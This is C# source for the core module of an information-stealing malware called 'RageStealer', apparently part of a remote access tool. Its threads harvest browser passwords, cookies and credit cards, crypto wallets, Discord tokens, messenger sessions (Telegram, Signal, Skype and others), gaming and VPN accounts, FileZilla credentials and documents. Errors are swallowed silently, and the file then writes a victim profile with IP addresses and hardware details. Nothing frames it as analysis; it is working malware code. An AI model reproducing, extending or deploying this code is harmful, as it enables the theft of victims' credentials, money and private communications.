using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using Plugin.Helper;
using RageStealer.Helpers;
using RageStealer.Target.Browsers.Chromium;
using RageStealer.Target.Browsers.Edge;
using RageStealer.Target.Browsers.Firefox;
using RageStealer.Target.Crypto;
using RageStealer.Target.Gaming;
using RageStealer.Target.Graber;
using RageStealer.Target.Messengers;
using RageStealer.Target.Server;
using RageStealer.Target.VPN;

namespace RageStealer.Target;

internal class Rage
{
	public static void Start(string sSavePath, bool water)
	{
		List<Thread> list = new List<Thread>();
		try
		{
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					RageStealer.Target.Browsers.Chromium.Recovery.Run(sSavePath + "\\Browsers", sSavePath + "\\Wallets");
					RageStealer.Target.Browsers.Edge.Recovery.Run(sSavePath + "\\Browsers", sSavePath + "\\Wallets");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					RageStealer.Target.Browsers.Firefox.Recovery.Run(sSavePath + "\\Browsers");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					Discord.WriteDiscord(Discord.GetTokens(), sSavePath + "\\Messenger\\Discord");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					Pidgin.Get(sSavePath + "\\Messenger\\Pidgin");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					Outlook.GrabOutlook(sSavePath + "\\Messenger\\Outlook");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					Telegram.GetTelegramSessions(sSavePath + "\\Messenger\\Telegram");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					Skype.GetSession(sSavePath + "\\Messenger\\Skype");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					Element.GetSession(sSavePath + "\\Messenger\\Element");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					Signal.GetSession(sSavePath + "\\Messenger\\Signal");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					Tox.GetSession(sSavePath + "\\Messenger\\Tox");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					Icq.GetSession(sSavePath + "\\Messenger\\ICQ");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					Steam.GetSteamSession(sSavePath + "\\Gaming\\Steam");
					Uplay.GetUplaySession(sSavePath + "\\Gaming\\Uplay");
					BattleNet.GetBattleNetSession(sSavePath + "\\Gaming\\BattleNET");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					Minecraft.SaveAll(sSavePath + "\\Gaming\\Minecraft");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					RageStealer.Target.Crypto.Crypto.GetWallets(sSavePath + "\\Wallets");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					FileZilla.WritePasswords(sSavePath + "\\FileZilla");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					ProtonVpn.Save(sSavePath + "\\VPN\\ProtonVPN");
					OpenVpn.Save(sSavePath + "\\VPN\\OpenVPN");
					NordVpn.Save(sSavePath + "\\VPN\\NordVPN");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					RageStealer.Target.Graber.Graber.Run(sSavePath + "\\Grabber");
				}
				catch
				{
				}
			}));
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list)
			{
				item2.Join();
			}
			string contents = (water ? " _____ _               _    ______      _   \n/  ___| |             | |   | ___ \\    | |  \n\\ `--.| |__   ___  ___| |_  | |_/ /__ _| |_ \n `--. \\ '_ \\ / _ \\/ _ \\ __| |    // _` | __|\n/\\__/ / | | |  __/  __/ |_  | |\\ \\ (_| | |_ \n\\____/|_| |_|\\___|\\___|\\__| \\_| \\_\\__,_|\\__|\n\n\n                           ____\n                    __,---'     `--.__\n                 ,-'                ; `.\n               ,'                  `--.`--.\n              ,'                       `._ `-.\n              ;                     ;     `-- ;\n            ,-'-_       _,-~~-.      ,--      `.\n            ;;   `-,;    ,'~`.__    ,;;;    ;  ;\n            ;;    ;,'  ,;;      `,  ;;;     `. ;\n            `:   ,'    `:;     __/  `.;      ; ;\n             ;~~^.   `.   `---'~~    ;;      ; ;\n             `,' `.   `.            .;;;     ;'\n             ,',^. `.  `._    __    `:;     ,'\n             `-' `--'    ~`--'~~`--.  ~    ,'\n            /;`-;_ ; ;. /. /   ; ~~`-.     ;\n           ; ;  ; `,;`-;__;---;      `----'\n           ``-`-;__;:  ;  ;__;\n                    `-- `-'\n\n\n\n" : "Sheet Rat Remake Stealer\n") + "\ud83d\udcb8 *Domains info:*" + Counter.GetLValue("\ud83c\udfe6 *Banking services*", Counter.DetectedBankingServices, '-') + Counter.GetLValue("\ud83d\udcb0 *Cryptocurrency services*", Counter.DetectedCryptoServices, '-') + Counter.GetLValue("\ud83c\udfa8 *Social networks*", Counter.DetectedSocialServices, '-') + Counter.GetLValue("\ud83c\udf53 *Porn websites*", Counter.DetectedPornServices, '-') + "\n\n\ud83c\udf10 *Browsers:*" + Counter.GetIValue("\ud83d\udd11 Passwords", Counter.Passwords) + Counter.GetIValue("\ud83d\udcb3 CreditCards", Counter.CreditCards) + Counter.GetIValue("\ud83c\udf6a Cookies", Counter.Cookies) + Counter.GetIValue("\ud83d\udcc2 AutoFill", Counter.AutoFill) + Counter.GetIValue("⏳ History", Counter.History) + Counter.GetIValue("\ud83d\udd16 Bookmarks", Counter.Bookmarks) + Counter.GetIValue("\ud83d\udce6 Downloads", Counter.Downloads) + Counter.GetIValue("\ud83d\udcb0 Wallet Extensions", Counter.BrowserWallets) + "\n\n\ud83d\uddc3 *Software:*" + Counter.GetIValue("\ud83d\udcb0 Wallets", Counter.Wallets) + Counter.GetIValue("\ud83d\udce1 FTP hosts", Counter.FtpHosts) + Counter.GetIValue("\ud83d\udc7e Discord tokens", Counter.DiscordTokens) + Counter.GetIValue("\ud83d\udd0c VPN accounts", Counter.Vpn) + Counter.GetIValue("\ud83e\udda2 Pidgin accounts", Counter.Pidgin) + Counter.GetSValue("\ud83d\udceb Outlook accounts", Counter.Outlook) + Counter.GetSValue("✈\ufe0f Telegram sessions", Counter.Telegram) + Counter.GetSValue("☁\ufe0f Skype session", Counter.Skype) + Counter.GetSValue("\ud83d\udc7e Discord token", Counter.Discord) + Counter.GetSValue("\ud83d\udcac Element session", Counter.Element) + Counter.GetSValue("\ud83d\udcad Signal session", Counter.Signal) + Counter.GetSValue("\ud83d\udd13 Tox session", Counter.Tox) + Counter.GetSValue("\ud83c\udfae Steam session", Counter.Steam) + Counter.GetSValue("\ud83c\udfae Uplay session", Counter.Uplay) + Counter.GetSValue("\ud83c\udfae BattleNET session", Counter.BattleNet) + Counter.GetSValue("\ud83c\udfae Minecraft", Counter.Minecraft) + "\n\n\ud83d\uddc3 *Grabber:*" + Counter.GetIValue("\ud83d\udd11 Documents", Counter.GrabberDocuments) + Counter.GetIValue("\ud83d\udcb3 DataBase", Counter.GrabberDatabases) + Counter.GetIValue("\ud83c\udf6a SourceCode", Counter.GrabberSourceCodes) + Counter.GetIValue("\ud83d\udcc2 Image", Counter.GrabberImages) + "\n\n\ud83d\uddc3 *Info:*\n[IP]\nExternal IP: " + SystemInfo.GetPublicIpAsync() + "\nInternal IP: " + SystemInfo.GetLocalIp() + "\nGateway IP: " + SystemInfo.GetDefaultGateway() + "\n\n[Machine]\nUsername: " + SystemInfo.Username + "\nCompname: " + SystemInfo.Compname + "\nSystem: " + SystemInfo.GetSystemVersion() + "\nCPU: " + SystemInfo.GetCpuName() + "\nGPU: " + SystemInfo.GetGpuName() + "\nRAM: " + SystemInfo.GetRamAmount() + "\nDATE: " + SystemInfo.Datenow + "\nSCREEN: " + SystemInfo.ScreenMetrics() + "\nBATTERY: " + SystemInfo.GetBattery();
			File.WriteAllText(sSavePath + "\\Info.txt", contents);
		}
		catch (Exception ex)
		{
			Client.Error(ex.Message);
		}
	}
}
